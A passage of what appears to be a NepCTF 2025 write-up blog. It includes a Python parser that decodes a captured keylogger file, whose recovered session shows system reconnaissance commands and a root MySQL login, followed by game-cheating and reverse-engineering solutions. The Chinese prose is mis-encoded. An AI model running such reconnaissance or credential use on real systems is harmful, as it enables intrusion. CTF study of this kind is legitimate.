class="string">&quot;U&quot;</span>, <span class="number">0x17</span>: <span class="string">&quot;I&quot;</span>, <span class="number">0x18</span>: <span class="string">&quot;O&quot;</span>, <span class="number">0x19</span>: <span class="string">&quot;P&quot;</span>,</span><br><span class="line">    <span class="number">0x1a</span>: <span class="string">&quot;&#123;&quot;</span>, <span class="number">0x1b</span>: <span class="string">&quot;&#125;&quot;</span>,</span><br><span class="line">    <span class="number">0x1e</span>: <span class="string">&quot;A&quot;</span>, <span class="number">0x1f</span>: <span class="string">&quot;S&quot;</span>, <span class="number">0x20</span>: <span class="string">&quot;D&quot;</span>, <span class="number">0x21</span>: <span class="string">&quot;F&quot;</span>, <span class="number">0x22</span>: <span class="string">&quot;G&quot;</span>,</span><br><span class="line">    <span class="number">0x23</span>: <span class="string">&quot;H&quot;</span>, <span class="number">0x24</span>: <span class="string">&quot;J&quot;</span>, <span class="number">0x25</span>: <span class="string">&quot;K&quot;</span>, <span class="number">0x26</span>: <span class="string">&quot;L&quot;</span>, <span class="number">0x27</span>: <span class="string">&quot;:&quot;</span>,</span><br><span class="line">    <span class="number">0x28</span>: <span class="string">&quot;\&quot;&quot;</span>, <span class="number">0x29</span>: <span class="string">&quot;~&quot;</span>,</span><br><span class="line">    <span class="number">0x2b</span>: <span class="string">&quot;|&quot;</span>,</span><br><span class="line">    <span class="number">0x2c</span>: <span class="string">&quot;Z&quot;</span>, <span class="number">0x2d</span>: <span class="string">&quot;X&quot;</span>, <span class="number">0x2e</span>: <span class="string">&quot;C&quot;</span>, <span class="number">0x2f</span>: <span class="string">&quot;V&quot;</span>, <span class="number">0x30</span>: <span class="string">&quot;B&quot;</span>,</span><br><span class="line">    <span class="number">0x31</span>: <span class="string">&quot;N&quot;</span>, <span class="number">0x32</span>: <span class="string">&quot;M&quot;</span>, <span class="number">0x33</span>: <span class="string">&quot;&lt;&quot;</span>, <span class="number">0x34</span>: <span class="string">&quot;&gt;&quot;</span>, <span class="number">0x35</span>: <span class="string">&quot;?&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_keylog</span>(<span class="params">file_path</span>):</span><br><span class="line">    event_format = struct.Struct(<span class="string">&#x27;2qHHI&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    result = []</span><br><span class="line">    shift_pressed = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                chunk = f.read(event_format.size)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(chunk) &lt; event_format.size:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                _, _, <span class="built_in">type</span>, code, value = event_format.unpack(chunk)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">if</span> code <span class="keyword">in</span> (<span class="number">0x2a</span>, <span class="number">0x36</span>): </span><br><span class="line">                        <span class="keyword">if</span> value == <span class="number">1</span>:</span><br><span class="line">                            shift_pressed = <span class="literal">True</span></span><br><span class="line">                        <span class="keyword">elif</span> value == <span class="number">0</span>:</span><br><span class="line">                            shift_pressed = <span class="literal">False</span></span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> value == <span class="number">1</span>:</span><br><span class="line">                        char = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                        <span class="keyword">if</span> shift_pressed:</span><br><span class="line">                            char = SHIFT_KEY_MAP.get(code, KEY_MAP.get(code, <span class="string">f&quot;[UNK_KEY:0x<span class="subst">&#123;code:x&#125;</span>]&quot;</span>))</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            char = KEY_MAP.get(code, <span class="string">f&quot;[UNK_KEY:0x<span class="subst">&#123;code:x&#125;</span>]&quot;</span>)</span><br><span class="line">                        </span><br><span class="line">                        result.append(char)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(result))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parse_keylog(<span class="string">r&quot;.\NepBot_keylogger&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#NepCTF&#123;NepCTF-20250725-114514&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># whoami[ENTER]</span></span><br><span class="line"><span class="comment"># ifconfig[ENTER]</span></span><br><span class="line"><span class="comment"># uanme -a[BACKSPACE][BACKSPACE]uname -a[ENTER]</span></span><br><span class="line"><span class="comment"># ps -aux[ENTER]</span></span><br><span class="line"><span class="comment"># cat /etc/issue[ENTER]</span></span><br><span class="line"><span class="comment"># pwd[ENTER]</span></span><br><span class="line"><span class="comment"># mysql -uroot -proot[ENTER]</span></span><br><span class="line"><span class="comment"># show databases;[ENTER]</span></span><br><span class="line"><span class="comment"># ue[BACKSPACE]se NE[BACKSPACE][BACKSPACE]NepCTF-20250725-114514;[ENTER]</span></span><br><span class="line"><span class="comment"># show tables;[ENTER]</span></span><br><span class="line"><span class="comment"># Enjoy yourself~[ENTER]</span></span><br><span class="line"><span class="comment"># See u again.[ENTER]</span></span><br><span class="line"><span class="comment"># Hacked By 1cePeak:)[ENTER]</span></span><br><span class="line"><span class="comment"># [L_CTRL]c</span></span><br></pre></td></tr></table></figure><h2 id="SpeedMino"><a href="#SpeedMino" class="headerlink" title="SpeedMino"></a>SpeedMino</h2><p>æ¸¸ç©æ¸¸æˆçš„å¯ä»¥å‘ç°èƒŒæ™¯æ˜¯ä¸€ç›´åœ¨å˜æ¢ï¼ŒçŒœæµ‹æ˜¯æ­£åœ¨è§£å¯†çš„flagï¼Œéœ€è¦è§£å¯†ä¸€å®šæ¬¡æ•°æ‰è¡Œï¼Œç›´æ¥CheatEngineé½¿è½®åŠ é€Ÿ100000000å€ï¼Œè®©ä»–åŠ é€Ÿè§£å¯†ï¼Œæ¸¸æˆç»“æŸå‰å°±ä¼šè§£å¯†å®Œã€‚</p><p><img src="/2025/07/28/NepCTF2025/image.png" alt="alt text"></p><p><img src="/2025/07/28/NepCTF2025/image-1.png" alt="alt text"></p><h2 id="MoewBleå–µæ³¡"><a href="#MoewBleå–µæ³¡" class="headerlink" title="MoewBleå–µæ³¡"></a>MoewBleå–µæ³¡</h2><p>CEé™„åŠ ï¼Œå¯ç”¨monoæ³¨å…¥åŠŸèƒ½ã€‚</p><p><img src="/2025/07/28/NepCTF2025/image-2.png" alt="alt text"></p><p>å•å‡»Lookup instancesæ‰¾åˆ°å®ä¾‹ï¼Œå°†è§’è‰²è¡€é‡æ”¹é«˜å°±ä¸ä¼šæ­»ã€‚</p><p><img src="/2025/07/28/NepCTF2025/image-3.png" alt="alt text"></p><p>èµ°éåœ°å›¾æ¥è§¦æ¯ä¸ªç‚¹å°±å¯ä»¥å¾—åˆ°å„ä¸ªéƒ¨åˆ†flagï¼Œè¿™è¾¹è¦åƒä¸€ä¸‹æœ€é¡¶ä¸Šçš„è¿™ä¸ªï¼Œæ‰èƒ½è§£é”å…¶ä¸­å‡ ä¸ªéšè—çš„ã€‚</p><p><img src="/2025/07/28/NepCTF2025/image-4.png" alt="alt text"></p><p>æç¤ºç¼ºå¤±çš„ç¬¬ä¸ƒæ®µflagåœ¨GMé¢æ¿è·å–ã€‚</p><p><img src="/2025/07/28/NepCTF2025/image-5.png" alt="alt text"></p><p>æ‰¾åˆ°GmManagerï¼ŒåŒæ ·æŸ¥æ‰¾å®ä¾‹ï¼Œç„¶åè°ƒç”¨è¿™ä¸ªOnKonamiCodeActivaiedå°±å¯ä»¥æ¿€æ´»GMé¢æ¿ã€‚</p><p><img src="/2025/07/28/NepCTF2025/image-6.png" alt="alt text"></p><p>ç‚¹å‡»å³ä¸Šè§’é½¿è½®æ‰“å¼€ï¼Œgetflag 7å³å¯å¾—åˆ°æœ€åéƒ¨åˆ†flagã€‚</p><p><img src="/2025/07/28/NepCTF2025/image-7.png" alt="alt text"></p><p><strong>NepCTF{94721248-773d-0b25-0e2d-db9cac299389}</strong></p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="RealMe"><a href="#RealMe" class="headerlink" title="RealMe"></a>RealMe</h2><p>å‘ç°mainå‡½æ•°ä¸‹é¢æœ‰ä¸ªå‡½æ•°ï¼Œä¹Ÿæ˜¯å˜ä½“RC4åŠ å¯†ï¼Œä¸è¿‡æ²¡è¢«è°ƒç”¨åˆ°ï¼ŒçŒœæµ‹æ˜¯æœ‰åè°ƒè¯•ã€‚</p><p><img src="/2025/07/28/NepCTF2025/image-8.png" alt="alt text"></p><p>x32dbgåŠ¨è°ƒï¼Œä½¿ç”¨Scyllahideæ’ä»¶ä¸€é”®è¿‡åè°ƒè¯•ï¼Œæ–­ç‚¹è¯¥å¤„ä»£ç ï¼Œå‘ç°è¢«è°ƒç”¨ï¼Œedxä¹Ÿå°±æ˜¯sboxï¼Œç›´æ¥æå–å‡ºæ¥ï¼Œå¯¹mainå‡½æ•°çš„å¯†æ–‡è§£å¯†å³å¯å¾—åˆ°flagã€‚</p><p><img src="/2025/07/28/NepCTF2025/image-9.png" alt="alt text"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title">sub_401A60</span><span class="params">(<span class="type">unsigned</span> __int8 *a1, <span class="type">unsigned</span> __int8 *a2, <span class="type">unsigned</span> <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> result&#123;&#125;; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> v4&#123;&#125;;              <span class="comment">// ecx</span></span><br><span class="line">    <span class="type">unsigned</span> __int8 v5&#123;&#125;;  <span class="comment">// al</span></span><br><span class="line">    <span class="type">unsigned</span> __int8 v6&#123;&#125;;  <span class="comment">// [esp+D3h] [ebp-35h]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i&#123;&#125;;      <span class="comment">// [esp+DCh] [ebp-2Ch]</span></span><br><span class="line">    <span class="type">int</span> v8&#123;&#125;;              <span class="comment">// [esp+F4h] [ebp-14h]</span></span><br><span class="line">    <span class="type">int</span> v9&#123;&#125;;              <span class="comment">// [esp+100h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        result = i;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= a3)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        v9 = (v9 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        v8 = (v8 + v9 * a1[v9]) % <span class="number">256</span>;</span><br><span class="line">        v6 = a1[v9];</span><br><span class="line">        a1[v9] = a1[v8];</span><br><span class="line">        a1[v8] = v6;</span><br><span class="line">        v4 = (a1[v8] + a1[v9]) % <span class="number">256</span>;</span><br><span class="line">        <span class="keyword">if</span> (!(i % <span class="number">2</span>))</span><br><span class="line">            v5 = a2[i] + a1[v4];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            v5 = a2[i] - a1[v4];</span><br><span class="line">        a2[i] = v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> data[<span class="number">256</span>] = &#123;</span><br><span class="line">        <span class="number">0x35</span>, <span class="number">0xE9</span>, <span class="number">0x55</span>, <span class="number">0xD7</span>, <span class="number">0x6E</span>, <span class="number">0x5F</span>, <span class="number">0x47</span>, <span class="number">0x3D</span>, <span class="number">0xCC</span>, <span class="number">0x9D</span>, <span class="number">0xD2</span>, <span class="number">0x6B</span>, <span class="number">0xEB</span>, <span class="number">0x52</span>, <span class="number">0x97</span>, <span class="number">0x19</span>,</span><br><span class="line">        <span class="number">0xD5</span>, <span class="number">0xC5</span>, <span class="number">0x80</span>, <span class="number">0x0B</span>, <span class="number">0x64</span>, <span class="number">0x2B</span>, <span class="number">0xCD</span>, <span class="number">0xF6</span>, <span class="number">0x95</span>, <span class="number">0xB1</span>, <span class="number">0x31</span>, <span class="number">0x34</span>, <span class="number">0x31</span>, <span class="number">0x08</span>, <span class="number">0x43</span>, <span class="number">0xBE</span>,</span><br><span class="line">        <span class="number">0x8C</span>, <span class="number">0x86</span>, <span class="number">0x16</span>, <span class="number">0x70</span>, <span class="number">0xFE</span>, <span class="number">0x36</span>, <span class="number">0x11</span>, <span class="number">0xFD</span>, <span class="number">0xA7</span>, <span class="number">0xB9</span>, <span class="number">0x55</span>, <span class="number">0xA0</span>, <span class="number">0x4E</span>, <span class="number">0x40</span>, <span class="number">0xDA</span>, <span class="number">0x08</span>,</span><br><span class="line">        <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xA2</span>, <span class="number">0x4C</span>, <span class="number">0x50</span>, <span class="number">0x47</span>, <span class="number">0x15</span>, <span class="number">0xCE</span>, <span class="number">0xC3</span>, <span class="number">0x8D</span>, <span class="number">0xB5</span>, <span class="number">0x00</span>, <span class="number">0xFB</span>, <span class="number">0x43</span>, <span class="number">0x07</span>, <span class="number">0x32</span>,</span><br><span class="line">        <span class="number">0x1D</span>, <span class="number">0x5E</span>, <span class="number">0xDC</span>, <span class="number">0x4D</span>, <span class="number">0xF5</span>, <span class="number">0x19</span>, <span class="number">0x98</span>, <span class="number">0x0F</span>, <span class="number">0x8D</span>, <span class="number">0xB0</span>, <span class="number">0xEC</span>, <span class="number">0x48</span>, <span class="number">0xAB</span>, <span class="number">0x92</span>, <span class="number">0x15</span>, <span class="number">0xD6</span>,</span><br><span class="line">        <span class="number">0xDA</span>, <span class="number">0x6F</span>, <span class="number">0x1B</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0x04</span>, <span class="number">0x84</span>, <span class="number">0x8A</span>, <span class="number">0x5B</span>, <span class="number">0x0E</span>, <span class="number">0x66</span>, <span class="number">0xB6</span>, <span class="number">0xA0</span>, <span class="number">0x1E</span>, <span class="number">0x2A</span>, <span class="number">0x6D</span>,</span><br><span class="line">        <span class="number">0x3C</span>, <span class="number">0x8F</span>, <span class="number">0x26</span>, <span class="number">0xC7</span>, <span class="number">0x90</span>, <span class="number">0x89</span>, <span class="number">0xDC</span>, <span class="number">0x8B</span>, <span class="number">0x87</span>, <span class="number">0xE0</span>, <span class="number">0x82</span>, <span class="number">0x57</span>, <span class="number">0xCE</span>, <span class="number">0x66</span>, <span class="number">0x13</span>, <span class="number">0x4B</span>,</span><br><span class="line">        <span class="number">0x49</span>, <span class="number">0x6A</span>, <span class="number">0x1F</span>, <span class="number">0x1A</span>, <span class="number">0x09</span>, <span class="number">0x32</span>, <span class="number">0x8E</span>, <span class="number">0x36</span>, <span class="number">0xAD</span>, <span class="number">0x65</span>, <span class="number">0x58</span>, <span class="number">0xBC</span>, <span class="number">0xD4</span>, <span class="number">0x5E</span>, <span class="number">0xD0</span>, <span class="number">0x2C</span>,</span><br><span class="line">        <span class="number">0x68</span>, <span class="number">0xBF</span>, <span class="number">0xBD</span>, <span class="number">0xA1</span>, <span class="number">0x45</span>, <span class="number">0x17</span>, <span class="number">0x16</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x4C</span>, <span class="number">0xFC</span>, <span class="number">0x0B</span>, <span class="number">0xB9</span>, <span class="number">0x49</span>, <span class="number">0xDB</span>, <span class="number">0x6F</span>,</span><br><span class="line">        <span class="number">0x37</span>, <span class="number">0x27</span>, <span class="number">0x30</span>, <span class="number">0x51</span>, <span class="number">0x69</span>, <span class="number">0x61</span>, <span class="number">0xD5</span>, <span class="number">0x75</span>, <span class="number">0xD3</span>, <span class="number">0x74</span>, <span class="number">0xEB</span>, <span class="number">0x4F</span>, <span class="number">0x23</span>, <span class="number">0x54</span>, <span class="number">0x0C</span>, <span class="number">0x1C</span>,</span><br><span class="line">        <span class="number">0x70</span>, <span class="number">0xDE</span>, <span class="number">0xE9</span>, <span class="number">0x7F</span>, <span class="number">0x62</span>, <span class="number">0x25</span>, <span class="number">0xF4</span>, <span class="number">0x84</span>, <span class="number">0x3E</span>, <span class="number">0x2F</span>, <span class="number">0x76</span>, <span class="number">0x03</span>, <span class="number">0x7A</span>, <span class="number">0x79</span>, <span class="number">0x5F</span>, <span class="number">0xCA</span>,</span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x41</span>, <span class="number">0x57</span>, <span class="number">0xC4</span>, <span class="number">0x97</span>, <span class="number">0x04</span>, <span class="number">0x33</span>, <span class="number">0x6C</span>, <span class="number">0x42</span>, <span class="number">0x4E</span>, <span class="number">0x38</span>, <span class="number">0x0E</span>, <span class="number">0xE7</span>, <span class="number">0x93</span>, <span class="number">0xE2</span>,</span><br><span class="line">        <span class="number">0x64</span>, <span class="number">0x3F</span>, <span class="number">0xB7</span>, <span class="number">0x5C</span>, <span class="number">0x5D</span>, <span class="number">0xE5</span>, <span class="number">0x59</span>, <span class="number">0x8C</span>, <span class="number">0x6D</span>, <span class="number">0xED</span>, <span class="number">0x34</span>, <span class="number">0x85</span>, <span class="number">0xDF</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x09</span>,</span><br><span class="line">        <span class="number">0x94</span>, <span class="number">0xB3</span>, <span class="number">0x05</span>, <span class="number">0x2E</span>, <span class="number">0x18</span>, <span class="number">0xD8</span>, <span class="number">0xBF</span>, <span class="number">0x7E</span>, <span class="number">0xAC</span>, <span class="number">0xAE</span>, <span class="number">0x9E</span>, <span class="number">0xD6</span>, <span class="number">0xC1</span>, <span class="number">0x3B</span>, <span class="number">0x54</span>, <span class="number">0x72</span>,</span><br><span class="line">        <span class="number">0x22</span>, <span class="number">0x5C</span>, <span class="number">0xE7</span>, <span class="number">0xD0</span>, <span class="number">0x6B</span>, <span class="number">0x25</span>, <span class="number">0xFE</span>, <span class="number">0xFF</span>, <span class="number">0xFB</span>, <span class="number">0x3B</span>, <span class="number">0x2D</span>, <span class="number">0x7C</span>, <span class="number">0x65</span>, <span class="number">0x5A</span>, <span class="number">0xCD</span>, <span class="number">0xF0</span>,</span><br><span class="line">        <span class="number">0xBD</span>, <span class="number">0x67</span>, <span class="number">0x74</span>, <span class="number">0x17</span>, <span class="number">0x02</span>, <span class="number">0x42</span>, <span class="number">0x2C</span>, <span class="number">0x2E</span>, <span class="number">0x5A</span>, <span class="number">0xA7</span>, <span class="number">0xD1</span>, <span class="number">0x73</span>, <span class="number">0x94</span>, <span class="number">0xAF</span>, <span class="number">0x89</span>, <span class="number">0x06</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> v7[<span class="number">35</span>]&#123;&#125;;</span><br><span class="line">    v7[<span class="number">0</span>] = <span class="string">&#x27;P&#x27;</span>;</span><br><span class="line">    v7[<span class="number">1</span>] = <span class="string">&#x27;Y&#x27;</span>;</span><br><span class="line">    v7[<span class="number">2</span>] = <span class="number">0xA2</span>;</span><br><span class="line">    v7[<span class="number">3</span>] = <span class="number">0x94</span>;</span><br><span class="line">    v7[<span class="number">4</span>] = <span class="number">0x2E</span>;</span><br><span class="line">    v7[<span class="number">5</span>] = <span class="number">0x8E</span>;</span><br><span class="line">    v7[<span class="number">6</span>] = <span class="number">0x5C</span>;</span><br><span class="line">    v7[<span class="number">7</span>] = <span class="number">0x95</span>;</span><br><span class="line">    v7[<span class="number">8</span>] = <span class="number">0x79</span>;</span><br><span class="line">    v7[<span class="number">9</span>] = <span class="number">0x16</span>;</span><br><span class="line">    v7[<span class="number">10</span>] = <span class="number">0xE5</span>;</span><br><span class="line">    v7[<span class="number">11</span>] = <span class="number">0x36</span>;</span><br><span class="line">    v7[<span class="number">12</span>] = <span class="number">0x60</span>;</span><br><span class="line">    v7[<span class="number">13</span>] = <span class="number">0xC7</span>;</span><br><span class="line">    v7[<span class="number">14</span>] = <span class="number">0xE8</span>;</span><br><span class="line">    v7[<span class="number">15</span>] = <span class="number">6</span>;</span><br><span class="line">    v7[<span class="number">16</span>] = <span class="number">0x33</span>;</span><br><span class="line">    v7[<span class="number">17</span>] = <span class="number">0x78</span>;</span><br><span class="line">    v7[<span class="number">18</span>] = <span class="number">0xF0</span>;</span><br><span class="line">    v7[<span class="number">19</span>] = <span class="number">0xD0</span>;</span><br><span class="line">    v7[<span class="number">20</span>] = <span class="number">0x36</span>;</span><br><span class="line">    v7[<span class="number">21</span>] = <span class="number">0xC8</span>;</span><br><span class="line">    v7[<span class="number">22</span>] = <span class="number">0x73</span>;</span><br><span class="line">    v7[<span class="number">23</span>] = <span class="number">0x1B</span>;</span><br><span class="line">    v7[<span class="number">24</span>] = <span class="number">0x65</span>;</span><br><span class="line">    v7[<span class="number">25</span>] = <span class="number">0x40</span>;</span><br><span class="line">    v7[<span class="number">26</span>] = <span class="number">0xB5</span>;</span><br><span class="line">    v7[<span class="number">27</span>] = <span class="number">0xD4</span>;</span><br><span class="line">    v7[<span class="number">28</span>] = <span class="number">0xE8</span>;</span><br><span class="line">    v7[<span class="number">29</span>] = <span class="number">0x9C</span>;</span><br><span class="line">    v7[<span class="number">30</span>] = <span class="number">0x65</span>;</span><br><span class="line">    v7[<span class="number">31</span>] = <span class="number">0xF4</span>;</span><br><span class="line">    v7[<span class="number">32</span>] = <span class="number">0xBA</span>;</span><br><span class="line">    v7[<span class="number">33</span>] = <span class="number">0x62</span>;</span><br><span class="line">    v7[<span class="number">34</span>] = <span class="number">0xD0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sub_401A60</span>(data, v7, <span class="number">35</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">35</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, v7[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NepCTF&#123;Y0u_FiN1sH_Th1s_E3sy_Smc!!!&#125;</span></span><br></pre></td></tr></table></figure><p><strong>NepCTF{Y0u_FiN1sH_Th1s_E3sy_Smc!!!}</strong></p><h2 id="CrackMe"><a href="#CrackMe" class="headerlink" title="CrackMe"></a>CrackMe</h2><p>å­—ç¬¦ä¸²å®šä½åˆ°æ ¸å¿ƒå‡½æ•°ã€‚</p><p>åˆ¤æ–­Passwordæ˜¯å¦ç¬¦åˆæ­£åˆ™ã€‚</p><p><img src="/2025/07/28/NepCTF2025/image-11.png" alt="alt text"></p><p>å°†Passwordç›´æ¥unhexï¼Œåˆ¤æ–­è½¬æˆçš„å­—èŠ‚é•¿åº¦æ˜¯å¦ç­‰äº16ã€‚è¯´æ˜æˆ‘ä»¬è¦è¾“å…¥32ä¸ªå­—ç¬¦ã€‚</p><p><img src="/2025/07/28/NepCTF2025/image-12.png" alt="alt text"></p><p>ä¸»æµç¨‹å¦‚ä¸‹ï¼š</p><p>1.MD5_Custom(Username)çš„å€¼ä½œä¸ºå¯†é’¥ã€‚</p><p>2.MD5_Custom(Username+â€Showmaker11â€)ä½œä¸ºå¯†æ–‡åœ¨ä¸‹é¢åˆ¤æ–­</p><p>3.AES_Custom(Password, Key)</p><p>4.åˆ¤æ–­AESç»“æœæ˜¯å¦ç­‰äºç¬¬äºŒæ­¥çš„å¯†æ–‡</p><p>è§£å¯†å°±æ˜¯MD5è·å–å¯†é’¥ï¼Œå°†ç¬¬äºŒæ­¥MD5å€¼ä½œä¸ºå¯†æ–‡è¿›è¡ŒAESè§£å¯†å³å¯å¾—åˆ°å¯¹åº”Passwordåå…­è¿›åˆ¶ã€‚</p><p><img src="/2025/07/28/NepCTF2025/image-10.png" alt="alt text"></p><p>MD5æ˜¯libcrypto.dllé‡Œé¢çš„å‡½æ•°ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨ï¼Œä¸éœ€è¦é€†å‘ã€‚</p><p>AESä¹Ÿæ˜¯libcrypto.dllçš„å‡½æ•°ï¼Œä½†æ˜¯å­˜åœ¨ä»£ç æµæ··æ·†å’Œé­”æ”¹ï¼Œå°†ä»£ç å—æ‰“ä¹±åˆ°ä¸åŒçš„ä½ç½®ï¼Œä¸è¿‡è¿˜æ˜¯å¯ä»¥é€šè¿‡è§‚å¯ŸçŸ¥é“é‚£äº›ä»£ç å—å¯¹åº”AESæµç¨‹ä¸­çš„å“ªä¸€æ­¥ã€‚</p><p>å¯ä»¥æ‰¾åˆ°Sboxï¼Œå‘ç°æ˜¯æ²¡æœ‰é­”æ”¹çš„å€¼ã€‚</p><p><img src="/2025/07/28/NepCTF2025/image-13.png" alt="alt text"></p><p>é€šè¿‡å¯¹æ¯”AESæ ‡å‡†ä»£ç ï¼Œå»æ‰¾ä¸€äº›å…³é”®ç‚¹è¿›è¡Œæ–­ç‚¹ï¼Œä¸”å°†å¯†æ–‡å¯†é’¥åŒæ­¥åˆ°æ ‡å‡†AESä»£ç è°ƒç”¨ï¼Œå¯¹æ­¤æ—¶ç¨‹åºçš„å¯†æ–‡æ•°æ®ä¸æ ‡å‡†AESçš„å¯†æ–‡æ•°æ®è¿›è¡Œå¯¹æ¯”ï¼Œçœ‹çœ‹æ˜¯å“ªä¸€æ­¥å¼€å§‹å¯¹ä¸ä¸Šï¼Œå°±æ˜¯é­”æ”¹çš„åœ°æ–¹ã€‚</p><p>å‘ç°åœ¨MixColumnså¤„å‡ºç°æ•°æ®å¯¹ä¸ä¸Šï¼Œå¯ä»¥çœ‹åˆ°å¯¹æ¯”æ ‡å‡†ä»£ç å¤šå¼‚æˆ–ä¸Šäº†0x55ã€‚</p><p><img src="/2025/07/28/NepCTF2025/image-15.png" alt="alt text"></p><p><img src="/2025/07/28/NepCTF2025/image-14.png" alt="alt text"></p><p>ç»è¿‡ä¿®æ”¹æ ‡å‡†AESä»£ç ï¼Œè¿›è¡ŒåŠ å¯†éªŒè¯ï¼Œå‘ç°å’Œè¯¥ç¨‹åºçš„AESåŠ 